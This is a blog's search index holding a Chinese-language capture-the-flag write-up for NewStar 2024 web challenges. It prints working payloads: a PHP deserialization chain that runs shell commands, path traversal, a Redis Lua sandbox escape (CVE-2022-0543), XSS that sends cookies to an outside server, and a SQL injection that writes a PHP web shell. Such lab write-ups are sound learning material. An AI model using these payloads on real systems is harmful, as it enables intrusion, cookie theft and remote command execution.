<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStar-2024</title>
      <link href="/2024/11/28/NewStar-2024/"/>
      <url>/2024/11/28/NewStar-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3 id="Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！"><a href="#Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！" class="headerlink" title="Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！"></a>Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！</h3><h1 id="臭皮吹泡泡"><a href="#臭皮吹泡泡" class="headerlink" title="臭皮吹泡泡"></a>臭皮吹泡泡</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">study</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">let_me</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$let_me</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sign_in</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">study</span>();</span><br><span class="line"><span class="variable">$obj1</span>-&gt;study=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$obj2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">let_me</span>();</span><br><span class="line"><span class="variable">$obj2</span>-&gt;let_me=<span class="string">&quot;\n system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$obj2</span>-&gt;time=<span class="keyword">new</span> <span class="title function_ invoke__">happy</span>();</span><br><span class="line"><span class="variable">$obj1</span>-&gt;study-&gt;ctf=[<span class="variable">$obj2</span>,<span class="string">&quot;get_flag&quot;</span>];</span><br><span class="line"><span class="variable">$obj1</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>;</span><br></pre></td></tr></table></figure><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p><code>[$Object,&quot; function &quot;]</code><br>能直接调用某个类下的函数<br><code>$object</code>与字符串比较时会直接调用<code>__tostring</code></p><h1 id="臭皮的网站"><a href="#臭皮的网站" class="headerlink" title="臭皮的网站"></a>臭皮的网站</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用 CVE 路径穿越获取 app.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>随机数种子为硬件地址即 mac 地址<br>利用路径穿越获取<br>&#x2F;static&#x2F;..&#x2F;..&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#00:16:3e:10:2d: 87</span></span><br><span class="line">random.seed(<span class="number">0x00163e102d87</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k = <span class="number">8</span>)))</span><br></pre></td></tr></table></figure><p>获取登录密码</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>登陆后,任意文件上传</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;./static/&#x27;</span> + file.filename</span><br></pre></td></tr></table></figure><p>利用路径穿越上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * root cat /*f* &gt; /app/static/bcd</span><br></pre></td></tr></table></figure><p>至&#x2F;etc&#x2F;cron.d&#x2F;a<br><code>失败,求解</code></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>发现subprocess.run中shell&#x3D;True</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">command = <span class="string">&quot;ls ./static&quot;</span>  <span class="comment">#cat /*f &gt;./static</span></span><br><span class="line"><span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    result = subprocess.run(command, shell = <span class="literal">True</span>, check = <span class="literal">True</span>, text = <span class="literal">True</span>, capture_output = <span class="literal">True</span>)</span><br><span class="line">    files_list = result.stdout</span><br><span class="line">    <span class="keyword">return</span> web.Response(text = <span class="string">&quot;static:&quot;</span>+files_list)</span><br></pre></td></tr></table></figure><p>得到Linux大神<code>inkey</code>的指点,直接修改&#x2F;bin&#x2F;ls的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /*f* &gt; ./static/114514</span><br></pre></td></tr></table></figure><p>再次访问&#x2F;static&#x2F;114514得到flag</p><h1 id="ezredis"><a href="#ezredis" class="headerlink" title="ezredis"></a>ezredis</h1><h2 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h2><h3 id="redis5版本之后，lua沙箱环境ban了config-set-dir等危险函数，Redis-lua沙盒逃逸-CVE-2022-0543"><a href="#redis5版本之后，lua沙箱环境ban了config-set-dir等危险函数，Redis-lua沙盒逃逸-CVE-2022-0543" class="headerlink" title="redis5版本之后，lua沙箱环境ban了config set dir等危险函数，Redis lua沙盒逃逸(CVE-2022-0543)"></a>redis5版本之后，lua沙箱环境ban了config set dir等危险函数，Redis lua沙盒逃逸(CVE-2022-0543)</h3><p><code>Debian 以及 Ubuntu 发行版的源在打包 Redis 时，在 Lua 沙箱中遗留了一个对象 package，攻击者可以利用这个对象提供的方法加载动态链接库 liblua 里的函数，进而逃逸沙箱执行任意命令。</code></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”);<br>local io &#x3D; io_l();<br>local f &#x3D; io.popen(“cat &#x2F;flag”, “r”);<br>local res &#x3D; f:read(“*a”);<br>f:close();<br>return res</p><p>local io_l&#x3D;package.loadlib(“&#x2F;user&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”,”luaopen_io”);</p><h1 id="pangbai过家家-5"><a href="#pangbai过家家-5" class="headerlink" title="pangbai过家家(5)"></a>pangbai过家家(5)</h1><h2 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h2><p>审计<br>发现api.ts里有localhost读信<br>发现&lt;…&gt;&lt;&#x2F;….&gt;被ban了<br>利用onerror以及<code>浏览器自动补全</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;x&quot; onerror = ; 绕过</span><br></pre></td></tr></table></figure><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>尝试了好久利用<code>onerror</code>获取cookie后fetch给vps</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;invalid.jpg&quot; onerror = &quot;fetch(&#x27;http://ip: port/cookie/&#x27; + encodeURIComponent(document.cookie));&quot;</span><br></pre></td></tr></table></figure><p>发现<code>sameSite:&#39;Strict&#39;</code>，无法带出</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>继续直接带出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;http://123.57.74.106:3389/?cookie =&quot; + encodeURIComponent(document.cookie);</span><br></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>得到提示可以把cookie通过<code>send</code> api再发出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;x&quot; onerror =&quot;</span><br><span class="line">fetch(&#x27;/api/send&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    title: &#x27;Cookie Theft&#x27;,</span><br><span class="line">    content: document.cookie</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><h1 id="sqlshell"><a href="#sqlshell" class="headerlink" title="sqlshell"></a>sqlshell</h1><h2 id="wp-4"><a href="#wp-4" class="headerlink" title="wp"></a>wp</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>-1 union select 1,2,3# 有回显123,写入&#x2F;var&#x2F;www&#x2F;html&#x2F;</p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02:"></a>0x02:</h3><p>-1’ union select 1,2,’<?php system($_GET[1]) ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’# </p><p>alicsscascs’ union select 1,2,’<?php system($_GET[1]) ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’#</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
